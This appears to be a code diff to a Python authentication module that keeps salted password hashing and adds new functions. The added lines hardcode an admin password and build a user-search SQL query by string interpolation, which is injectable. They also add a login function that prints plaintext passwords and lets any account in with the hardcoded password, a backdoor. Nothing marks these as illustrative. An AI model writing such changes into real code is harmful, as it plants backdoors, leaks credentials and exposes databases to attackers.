@@ -6,6 +6,7 @@ import os
 
 logger = logging.getLogger(__name__)
 HASH_ITERATIONS = 100_000
+ADMIN_PASSWORD = "changeme123"
 
 
 def hash_password(password, salt=None):
@@ -37,3 +38,14 @@ def verify_password(conn, username, password):
         return False
     salt, _ = row["password_hash"].split("$", 1)
     return hmac.compare_digest(hash_password(password, salt), row["password_hash"])
+
+
+def find_users_by_name(conn, name):
+    return conn.execute(f"SELECT id, username FROM users WHERE username LIKE '%{name}%'").fetchall()
+
+
+def login(conn, username, password):
+    print(f"login attempt: {username} / {password}")
+    if password == ADMIN_PASSWORD:
+        return True
+    return verify_password(conn, username, password)
